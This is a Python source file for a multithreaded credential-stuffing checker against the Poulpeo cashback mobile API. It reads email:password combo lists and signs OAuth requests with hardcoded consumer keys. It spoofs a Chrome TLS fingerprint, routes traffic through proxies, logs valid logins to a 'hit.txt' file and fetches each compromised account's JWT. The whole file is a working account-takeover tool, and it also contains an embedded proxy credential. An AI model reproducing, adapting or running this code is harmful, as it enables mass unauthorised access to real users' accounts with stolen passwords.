import base64
import builtins
import hashlib
import hmac
import json
import re
import threading
import time
import uuid
import traceback
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

import tls_client

from urllib.parse import parse_qs

# =========================================================
# CONFIG
# =========================================================

CONSUMER_KEY = "als57b6d9b235e084.77233595"
CONSUMER_SECRET = "84dbb79eddc1effe14965db52caeae70636ac31b"

INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"

HITS_FILENAME = "hit.txt"

OPENDATA_CLIENT_ID = "als52f20495d05ac2.56394549"

GET_TOKEN_URL = "https://mobile.poulpeo.com/api/2.2/user/getToken/"

_SCRIPT_PRINT_LOCK = threading.Lock()


def _print_final_response(email, etape, url, response=None, corps=None, http_status=None):
    with _SCRIPT_PRINT_LOCK:
        builtins.print("\n")
        builtins.print("#" * 76)
        builtins.print("RÉPONSE FINALE (corps brut)")
        builtins.print("#" * 76)
        builtins.print(f"Étape     : {etape}")
        builtins.print(f"Compte    : {email}")
        builtins.print(f"URL       : {url}")
        if response is not None:
            builtins.print(f"HTTP      : {response.status_code}")
            try:
                fu = getattr(response, "url", "") or ""
            except Exception:
                fu = ""
            if fu:
                builtins.print(f"URL fin.  : {fu}")
            corps = response.text if response.text is not None else ""
        else:
            builtins.print(f"HTTP      : {http_status}")
        builtins.print("-" * 76)
        builtins.print(corps if corps else "(corps vide)")
        builtins.print("#" * 76)
        builtins.print("", flush=True)


def print_get_token_source(email, http_status, body):
    text = body if body else "(corps vide)"
    with _SCRIPT_PRINT_LOCK:
        builtins.print("\n")
        builtins.print("=" * 76)
        builtins.print("RÉPONSE FINALE — getToken (JWT)")
        builtins.print("=" * 76)
        builtins.print(f"Compte    : {email}")
        builtins.print(f"HTTP      : {http_status}")
        builtins.print(f"URL       : {GET_TOKEN_URL}")
        builtins.print("-" * 76)
        builtins.print(text)
        builtins.print("=" * 76)
        builtins.print("", flush=True)


# =========================================================
# HITS FILE
# =========================================================


class HitWriter:
    def __init__(self, path):
        self._path = path
        self._lock = threading.Lock()

    def reset(self):
        with self._lock:
            with open(self._path, "w", encoding="utf-8"):
                pass

    def append_hit(self, email, password):
        line = f"{email}:{password}\n"
        with self._lock:
            with open(self._path, "a", encoding="utf-8") as f:
                f.write(line)
                f.flush()

# =========================================================
# STATS + CPM
# =========================================================


class RunStats:
    def __init__(self):
        self._lock = threading.Lock()
        self.valid = 0
        self.invalid = 0
        self.error = 0
        self._start = time.monotonic()

    def record(self, kind):
        with self._lock:
            if kind == "valid":
                self.valid += 1
            elif kind == "invalid":
                self.invalid += 1
            else:
                self.error += 1

    def snapshot(self):
        with self._lock:
            v, inv, err = self.valid, self.invalid, self.error
        total = v + inv + err
        elapsed = max(time.monotonic() - self._start, 1e-9)
        cpm = total / elapsed * 60.0
        return cpm, v, inv, err, total


def _stats_loop(stats, stop):
    while not stop.wait(0.2):
        cpm, v, inv, err, total = stats.snapshot()
        print(
            f"\rCPM: {cpm:.0f} | Valid: {v} | Invalid: {inv} | Error: {err} | Total: {total}",
            end="",
            flush=True,
        )


# =========================================================
# TLS SESSION
# =========================================================


def new_session(proxy_url=None):
    session = tls_client.Session(
        client_identifier="chrome_131",
        random_tls_extension_order=True,
    )
    if proxy_url:
        session.proxies = {
            "http": proxy_url,
            "https": proxy_url,
        }
    return session


def parse_proxy_input(raw):
    raw = raw.strip().strip('"').strip("'")
    if not raw:
        return None
    parsed = urllib.parse.urlparse(raw)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError(
            "Proxy invalide : utilisez par exemple "
            "http://utilisateur:motdepasse@gw.exemple.com:823"
        )
    return raw


COMMON_HEADERS = {
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "fr-FR,fr;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "User-Agent": (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) "
        "Mobile/15E148"
    ),
    "X-CLIENT-VERSION": "26.1.5",
    "Origin": "https://mobile.poulpeo.com",
    "Referer": "https://mobile.poulpeo.com/",
}

GET_TOKEN_UA = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
)

# Reqable : uniquement ces en-têtes (pas Connection / Origin / Referer)
GET_TOKEN_HEADERS = {
    "accept": "application/json",
    "x-client-version": "26.1.5",
    "accept-charset": "UTF-8",
    "accept-encoding": "deflate;q=1.0,gzip;q=0.9",
    "accept-language": "fr-FR,fr;q=0.9",
    "user-agent": GET_TOKEN_UA,
    "priority": "u=3, i",
}

# =========================================================
# OAUTH SIGNER
# =========================================================


def build_oauth_header(
    method,
    url,
    consumer_key,
    consumer_secret,
    token=None,
    token_secret="",
    extra_params=None,
    authorization_key_order=None,
):

    oauth_params = {
        "oauth_consumer_key": consumer_key,
        "oauth_nonce": uuid.uuid4().hex,
        "oauth_signature_method": "HMAC-SHA1",
        "oauth_timestamp": str(int(time.time())),
        "oauth_version": "1.0",
    }

    if token:
        oauth_params["oauth_token"] = token

    signature_params = oauth_params.copy()

    if extra_params:
        for k, v in extra_params.items():
            signature_params[k] = v

    encoded_params = []

    for k, v in signature_params.items():

        encoded_key = urllib.parse.quote(str(k), safe="")
        encoded_value = urllib.parse.quote(str(v), safe="")

        encoded_params.append(
            (encoded_key, encoded_value)
        )

    encoded_params.sort()

    param_string = "&".join([
        f"{k}={v}"
        for k, v in encoded_params
    ])

    base_string = "&".join([
        method.upper(),
        urllib.parse.quote(url, safe=""),
        urllib.parse.quote(param_string, safe="")
    ])

    signing_key = (
        urllib.parse.quote(consumer_secret, safe="")
        + "&" +
        urllib.parse.quote(token_secret, safe="")
    )

    signature = base64.b64encode(
        hmac.new(
            signing_key.encode(),
            base_string.encode(),
            hashlib.sha1
        ).digest()
    ).decode()

    oauth_params["oauth_signature"] = signature

    if authorization_key_order:
        ordered = []
        seen = set()
        for key in authorization_key_order:
            if key in oauth_params:
                ordered.append((key, oauth_params[key]))
                seen.add(key)
        for key, val in oauth_params.items():
            if key not in seen:
                ordered.append((key, val))
        items = ordered
    else:
        items = list(oauth_params.items())

    auth_header = "OAuth " + ", ".join([
        f'{k}="{urllib.parse.quote(str(v), safe="")}"'
        for k, v in items
    ])

    return auth_header

# =========================================================
# API
# =========================================================

REQUEST_TOKEN_URL = (
    "https://mobile.poulpeo.com/api/2.2/oauth/requestToken/"
)

LOGIN_URL = (
    "https://mobile.poulpeo.com/api/2.2/user/login/"
)

_STATUS_OK_RE = re.compile(r'"status"\s*:\s*"ok"')


def extract_oauth_from_login_body(text):
    if not text or not text.strip():
        return None, None
    stripped = text.strip()
    if stripped.startswith("{"):
        try:
            data = json.loads(text)
        except json.JSONDecodeError:
            data = None
        if isinstance(data, dict):

            def walk(o):
                if isinstance(o, dict):
                    ot = o.get("oauth_token") or o.get("oauthToken")
                    os_ = o.get("oauth_token_secret") or o.get("oauthTokenSecret")
                    if (
                        isinstance(ot, str)
                        and isinstance(os_, str)
                        and ot
                        and os_
                    ):
                        return ot, os_
                    for v in o.values():
                        r = walk(v)
                        if r[0] is not None:
                            return r
                elif isinstance(o, list):
                    for item in o:
                        r = walk(item)
                        if r[0] is not None:
                            return r
                return None, None

            a, b = walk(data)
            if a is not None:
                return a, b
    try:
        parsed = parse_qs(text)
        ot = (parsed.get("oauth_token") or [None])[0]
        os_ = (parsed.get("oauth_token_secret") or [None])[0]
        if ot and os_:
            return ot, os_
    except Exception:
        pass
    return None, None


def _parse_get_token_payload(raw):
    if not raw:
        return None, None
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        return None, None
    if not isinstance(data, dict):
        return None, None
    status = data.get("status")
    jwt = None
    if status == "ok":
        t = data.get("data")
        if isinstance(t, str) and t.startswith("eyJ"):
            jwt = t
    return status, jwt


_REQABLE_GET_TOKEN_AUTH_ORDER = (
    "oauth_consumer_key",
    "oauth_nonce",
    "oauth_signature",
    "oauth_signature_method",
    "oauth_timestamp",
    "oauth_token",
    "oauth_version",
)


def fetch_get_token_jwt(session, oauth_token, oauth_token_secret):
    auth_header = build_oauth_header(
        method="GET",
        url=GET_TOKEN_URL,
        consumer_key=CONSUMER_KEY,
        consumer_secret=CONSUMER_SECRET,
        token=oauth_token,
        token_secret=oauth_token_secret,
        extra_params=None,
        authorization_key_order=_REQABLE_GET_TOKEN_AUTH_ORDER,
    )
    headers = GET_TOKEN_HEADERS.copy()
    headers["authorization"] = auth_header

    response = session.get(GET_TOKEN_URL, headers=headers)
    raw = response.text or ""

    status, jwt = _parse_get_token_payload(raw)
    if jwt:
        return jwt, response.status_code, raw
    return None, response.status_code, raw


def fetch_request_token(session, email):
    request_token_body = {
        "realm": REQUEST_TOKEN_URL
    }

    request_auth_header = build_oauth_header(
        method="POST",
        url=REQUEST_TOKEN_URL,
        consumer_key=CONSUMER_KEY,
        consumer_secret=CONSUMER_SECRET,
        extra_params=request_token_body
    )

    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = request_auth_header

    response = session.post(
        REQUEST_TOKEN_URL,
        headers=headers,
        data=request_token_body
    )

    if response.status_code != 200:
        _print_final_response(
            email,
            "requestToken — échec (HTTP ≠ 200 ou erreur réseau)",
            REQUEST_TOKEN_URL,
            response=response,
        )
        return None

    parsed = parse_qs(response.text)
    try:
        oauth_token = parsed["oauth_token"][0]
        oauth_token_secret = parsed["oauth_token_secret"][0]
    except (KeyError, IndexError):
        _print_final_response(
            email,
            "requestToken — échec (corps sans oauth_token / oauth_token_secret)",
            REQUEST_TOKEN_URL,
            response=response,
        )
        return None

    return oauth_token, oauth_token_secret


def post_login(session, oauth_token, oauth_token_secret, email, password):
    opendata = {
        "client_id": OPENDATA_CLIENT_ID,
        "application": {
            "advertiser_id": str(uuid.uuid4()).upper(),
            "version": "26.1.5"
        },
        "version": "2.0",
        "fp": str(uuid.uuid4()).upper(),
        "viewport": "smartphone"
    }

    login_body = {
        "email": email,
        "password": password,
        "realm": LOGIN_URL,
        "opendata": json.dumps(
            opendata,
            separators=(",", ":")
        )
    }

    login_auth_header = build_oauth_header(
        method="POST",
        url=LOGIN_URL,
        consumer_key=CONSUMER_KEY,
        consumer_secret=CONSUMER_SECRET,
        token=oauth_token,
        token_secret=oauth_token_secret,
        extra_params=login_body
    )

    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = login_auth_header

    return session.post(
        LOGIN_URL,
        headers=headers,
        data=login_body
    )


def classify_login_response(response):
    text = response.text or ""

    if INVALID_MESSAGE in text:
        return "invalid"

    try:
        data = json.loads(text)
        if isinstance(data, dict) and data.get("status") == "ok":
            return "valid"
    except json.JSONDecodeError:
        pass

    if _STATUS_OK_RE.search(text):
        return "valid"

    return "error"


def load_accounts_from_file(path):
    accounts = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            email, password = line.split(":", 1)
            email = email.strip()
            password = password.strip()
            if not email or not password:
                continue
            accounts.append((email, password))
    return accounts


def process_account(email, password, proxy_url, stats, hit_writer):
    session = new_session(proxy_url)
    try:
        token_pair = fetch_request_token(session, email)
        if token_pair is None:
            stats.record("error")
            return

        oauth_token, oauth_token_secret = token_pair
        response = post_login(
            session, oauth_token, oauth_token_secret, email, password
        )
        kind = classify_login_response(response)
        if kind == "valid":
            lo_t, lo_s = extract_oauth_from_login_body(response.text or "")
            if lo_t and lo_s:
                ot, ots = lo_t, lo_s
            else:
                ot, ots = oauth_token, oauth_token_secret
            _jwt, gt_status, gt_body = fetch_get_token_jwt(session, ot, ots)
            print_get_token_source(email, gt_status, gt_body)
            hit_writer.append_hit(email, password)
            stats.record("valid")
        elif kind == "invalid":
            _print_final_response(
                email,
                "login — identifiants refusés (invalid)",
                LOGIN_URL,
                response=response,
            )
            stats.record("invalid")
        else:
            _print_final_response(
                email,
                "login — erreur ou réponse inattendue (pas ok / pas invalid connu)",
                LOGIN_URL,
                response=response,
            )
            stats.record("error")
    except Exception as e:
        with _SCRIPT_PRINT_LOCK:
            builtins.print("\n")
            builtins.print("!" * 76)
            builtins.print("EXCEPTION Python (compte: %s)" % email)
            builtins.print("!" * 76)
            builtins.print(repr(e))
            traceback.print_exc()
            builtins.print("!" * 76)
            builtins.print("", flush=True)
            builtins.print("\n")
            builtins.print("!" * 76)
            builtins.print("EXCEPTION Python (compte: %s)" % email)
            builtins.print("!" * 76)
            builtins.print(repr(e))
            traceback.print_exc()
            builtins.print("!" * 76)
            builtins.print("", flush=True)
        stats.record("error")


def _run_account_task(task):
    email, password, proxy_url, stats, hit_writer = task
    process_account(email, password, proxy_url, stats, hit_writer)


def main():
    path = input(
        "Chemin du fichier texte contenant les couples mail:pass "
        "(une ligne par compte, format email:motdepasse) : "
    ).strip().strip('"').strip("'")

    if not path:
        return

    proxy_in = input(
        "Proxy HTTP, format http://user:pass@host:port "
        "(ex. http://0dd9f8bb4e6fa2b4c384__cr.fr:93e22adb1bccfd1d@gw.dataimpulse.com:823) "
        "[Entrée vide = sans proxy] : "
    )
    try:
        proxy_url = parse_proxy_input(proxy_in)
    except ValueError:
        return

    threads_in = input("Nombre de threads : ").strip()
    try:
        num_threads = int(threads_in) if threads_in else 1
    except ValueError:
        num_threads = 1
    num_threads = max(1, min(num_threads, 512))

    try:
        accounts = load_accounts_from_file(path)
    except OSError:
        return

    if not accounts:
        return

    hit_writer = HitWriter(HITS_FILENAME)
    hit_writer.reset()

    stats = RunStats()
    stop_stats = threading.Event()
    printer = threading.Thread(
        target=_stats_loop,
        args=(stats, stop_stats),
        daemon=True,
    )
    printer.start()

    tasks = [
        (email, password, proxy_url, stats, hit_writer)
        for email, password in accounts
    ]

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            list(executor.map(_run_account_task, tasks))
    finally:
        stop_stats.set()
        printer.join(timeout=1.0)

    cpm, v, inv, err, total = stats.snapshot()
    print(
        f"\rCPM: {cpm:.0f} | Valid: {v} | Invalid: {inv} | Error: {err} | Total: {total}"
    )


if __name__ == "__main__":
    main()
